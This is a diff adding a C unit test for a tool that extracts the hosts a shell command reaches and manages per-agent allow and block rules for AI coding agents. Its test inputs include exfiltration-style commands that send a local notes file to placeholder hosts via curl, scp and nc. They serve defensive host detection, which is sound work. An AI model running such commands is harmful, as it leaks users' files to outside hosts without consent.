@@ -2198,6 +2198,42 @@ static void test_temporary_rule(void) {
     char cmd[700]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
 }
 
+/* Spec §5.3: Preview 1's terminal rules (kai allow / block / rules / undo),
+ * the hosts a command reaches, and refusing inside an agent. */
+static void test_agent_rules(void) {
+    printf("terminal rules: kai allow / block / undo (spec 5.3)\n");
+    char hosts[8][256];
+    int n = kai_command_hosts("curl -sS -d @notes.txt https://Up.Example.net:8443/x?y=1", hosts, 8);
+    CHECK(n == 1 && !strcmp(hosts[0], "up.example.net"), "a URL's host, lowercased, no port");
+    n = kai_command_hosts("scp notes.txt deploy@db.example.com:/tmp && nc paste.example.org 9000 < notes.txt", hosts, 8);
+    CHECK(n == 2 && !strcmp(hosts[0], "db.example.com") && !strcmp(hosts[1], "paste.example.org"),
+          "scp user@host: and nc <host>");
+    CHECK(kai_command_hosts("cat notes.txt | grep x", hosts, 8) == 0, "no destination: none");
+
+    long long now = (long long)time(NULL);
+    char rp[1200]; snprintf(rp, sizeof rp, "%s/agent-rules.json", kai_home());
+    unlink(rp);
+    CHECK(kai_agent_rule_for("claude", "up.example.net", now) == 0, "no rules: nothing");
+    CHECK(kai_agent_rule_add(KAI_AGENT_RULE_ALLOW, "claude", "up.example.net", now + 3600) == 0, "allow for 1h");
+    CHECK(kai_agent_rule_for("claude", "up.example.net", now) == KAI_AGENT_RULE_ALLOW, "...applies to that agent");
+    CHECK(kai_agent_rule_for("codex", "up.example.net", now) == 0, "...not another agent");
+    CHECK(kai_agent_rule_for("claude", "x.up.example.net", now) == 0, "...not a subdomain");
+    CHECK(kai_agent_rule_for("claude", "up.example.net", now + 7200) == 0, "...and ends after an hour");
+    CHECK(kai_agent_rule_add(KAI_AGENT_RULE_BLOCK, "*", "example.org", 0) == 0, "block for every agent");
+    CHECK(kai_agent_rule_for("cursor", "cdn.example.org", now) == KAI_AGENT_RULE_BLOCK,
+          "a block covers subdomains and every agent");
+    CHECK(kai_agent_rule_undo() == 0 && kai_agent_rule_for("cursor", "example.org", now) == 0,
+          "undo reverses the last change");
+    CHECK(kai_agent_rule_for("claude", "up.example.net", now) == KAI_AGENT_RULE_ALLOW, "...and only the last");
+    CHECK(kai_agent_rule_undo() == 0 && kai_agent_rule_for("claude", "up.example.net", now) == 0, "undo again");
+    CHECK(kai_agent_rule_undo() != 0, "nothing left to undo");
+    CHECK(kai_agent_rule_add(KAI_AGENT_RULE_ALLOW, "claude", "203.0.113.5", now + 3600) == 0,
+          "an address can be allowed from the terminal (the user typed it)");
+    unlink(rp);
+
+    unlink(rp);
+}
+
 static void test_claude_env(void) {
     printf("Claude Code env switch (telemetry off)\n");
     char dir[] = "/tmp/kai-envXXXXXX";
@@ -2702,6 +2738,7 @@ int main(void) {
     test_audit_rotation_chain();
     test_decision_rules();
     test_claude_env();
+    test_agent_rules();
     test_temporary_rule();
     test_daily_counter();
     test_revocation_reaches_ro_store();
